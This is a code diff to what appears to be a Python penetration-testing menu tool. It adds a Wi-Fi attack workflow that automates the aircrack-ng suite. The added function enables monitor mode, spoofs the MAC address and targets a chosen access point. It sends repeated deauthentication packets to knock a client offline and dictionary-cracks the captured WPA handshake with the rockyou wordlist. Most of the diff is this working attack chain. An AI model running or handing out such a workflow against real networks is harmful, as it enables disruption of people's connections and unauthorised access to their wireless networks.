@@ -786,9 +786,10 @@ def main():
             elif choice == "17":  # Escape restricted bash #!FIXME  #TODO: NEEDS MAINTENANCE AND REFACTORING TO BECOME FUNCTIONAL
                 xvii_escape_rbash()
 
-            elif choice == "18":  # Windows Tip Reminders
-                print("[WARNING] This function is not implemented yet")
+            elif choice == "18":  # Wifi attack workflow
+                print("[>>> WARNING! <<<] This feature has not been properly tested. Proceed at your own risk. [>>> WARNING! <<<]")
                 pause()
+                wifi_attack_workflow()
 
             elif choice == "19":  # NMAP Network Scanner
                 print("[WARNING] This function is not implemented yet")
@@ -1700,6 +1701,176 @@ def xvii_escape_rbash():
     """
     check_installed_commands()
     pause()
+
+# Main function to execute all steps of a wireless penetration test workflow.
+def wifi_attack_workflow():
+    """
+    Main function to execute all steps of a wireless penetration test workflow.
+    Includes helper functions for setup, monitoring, attacks, and password cracking.
+    """
+
+    def validate_mac_address(mac_address):
+        """
+        Validates the format of a MAC address.
+        Example: 00:1A:2B:3C:4D:5E
+        """
+        return re.match(r"^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$", mac_address)
+
+    def validate_channel(channel):
+        """
+        Validates the wireless channel (must be an integer between 1 and 165).
+        """
+        try:
+            channel = int(channel)
+            return 1 <= channel <= 165
+        except ValueError:
+            return False
+
+    def pre_configurations():
+        """
+        Preliminary setup: Disables the 'mon0' interface from monitor mode.
+        """
+        try:
+            subprocess.run(["airmon-ng", "stop", "mon0"], check=True)
+            print("[INFO] Disabled 'mon0' monitor mode.")
+        except subprocess.CalledProcessError:
+            print("[WARNING] Failed to disable 'mon0'. Make sure the interface is active in monitor mode.")
+
+    def available_interfaces():
+        """
+        Displays available wireless interfaces and allows the user to select one for monitor mode.
+        """
+        try:
+            print("\n=========== Available Wireless Interfaces ===========")
+            subprocess.run(["airmon-ng"], check=True)
+            print("\n=====================================================")
+            interface = input("Enter the wireless interface to enable monitor mode: ").strip()
+            return interface
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to list wireless interfaces.")
+            return None
+
+    def initial_configurations(interface):
+        """
+        Initial configurations: Disables the interface, sets monitor mode, changes MAC address, and kills interfering processes.
+        """
+        try:
+            print(f"[INFO] Configuring interface '{interface}' for monitor mode...")
+            subprocess.run(["ifconfig", interface, "down"], check=True)
+            subprocess.run(["iw", "dev", interface, "interface", "add", "mon0", "type", "monitor"], check=True)
+            subprocess.run(["macchanger", "-r", "mon0"], check=True)
+            subprocess.run(["airmon-ng", "check", "kill"], check=True)
+            print("[INFO] Initial configurations completed. Monitor mode enabled on 'mon0'.")
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to complete initial configurations.")
+
+    def promiscuous_monitoring():
+        """
+        Starts promiscuous monitoring with airodump-ng and logs the output to a file.
+        """
+        timestamp = time.strftime("%d%H%M%b%y")
+        log_file = f"monitoring_log_{timestamp}.cap"
+
+        try:
+            subprocess.run(["airodump-ng", "mon0", "--write", log_file], check=True)
+            print(f"[INFO] Promiscuous monitoring started. Logs saved to {log_file}.")
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to start promiscuous monitoring.")
+
+    def scan_target_ap():
+        """
+        Scans a target AP and logs the results.
+        """
+        while True:
+            bssid = input("Enter the BSSID (MAC address) of the target AP: ").strip()
+            if not validate_mac_address(bssid):
+                print("[ERROR] Invalid BSSID format. Please try again.")
+                continue
+
+            channel = input("Enter the channel of the target AP: ").strip()
+            if not validate_channel(channel):
+                print("[ERROR] Invalid channel. Please enter a value between 1 and 165.")
+                continue
+
+            break
+
+        try:
+            log_file = "scan_ap_target_log"
+            subprocess.run(["airodump-ng", "mon0", "--bssid", bssid, "-c", channel, "--write", log_file], check=True)
+            print(f"[INFO] AP scan completed. Logs saved to {log_file}.")
+            return bssid, channel
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to scan the target AP.")
+            return None, None
+
+    def capture_handshake(bssid, channel):
+        """
+        Captures the handshake between the client and the target AP.
+        """
+        try:
+            log_file = "handshake_capture_log"
+            subprocess.Popen(
+                ["airodump-ng", "mon0", "--bssid", bssid, "-c", channel, "--write", log_file],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL,
+            )
+            print(f"[INFO] Handshake capture started. Logs saved to {log_file}.")
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to capture handshake.")
+
+    def deauth_attack(bssid):
+        """
+        Performs a deauthentication attack on a target client.
+        """
+        while True:
+            client_mac = input("Enter the MAC address of the client to deauthenticate: ").strip()
+            if not validate_mac_address(client_mac):
+                print("[ERROR] Invalid MAC address format. Please try again.")
+                continue
+            break
+
+        try:
+            for i in range(1, 4):  # Sends three rounds of deauth packets
+                subprocess.run(["aireplay-ng", "--deauth=5", "-a", bssid, "-c", client_mac, "mon0"], check=True)
+                print(f"[INFO] Deauth attempt {i} completed. Waiting 5 seconds before the next attempt...")
+                if i < 3:
+                    time.sleep(5)
+            print("[INFO] Deauthentication attack completed.")
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to perform deauthentication attack.")
+
+    def crack_password_with_dictionary():
+        """
+        Attempts to crack the password using a dictionary.
+        """
+        try:
+            subprocess.run(
+                ["aircrack-ng", "handshake_capture_log*.cap", "-w", "/usr/share/wordlists/rockyou.txt"], check=True
+            )
+            print("[INFO] Password cracking attempt completed.")
+        except subprocess.CalledProcessError:
+            print("[ERROR] Failed to crack the password.")
+
+    # Main Workflow
+    try:
+        pre_configurations()
+        interface = available_interfaces()
+        if not interface:
+            return
+
+        initial_configurations(interface)
+        promiscuous_monitoring()
+        bssid, channel = scan_target_ap()
+        if not bssid or not channel:
+            return
+
+        capture_handshake(bssid, channel)
+        deauth_attack(bssid)
+        crack_password_with_dictionary()
+
+        input("\nPress ENTER to return to the main menu...")
+    except KeyboardInterrupt:
+        print("\n[INFO] Process interrupted by user. Returning to the main menu.")
 
 # Run the main function when the script is executed directly
 if __name__ == "__main__":
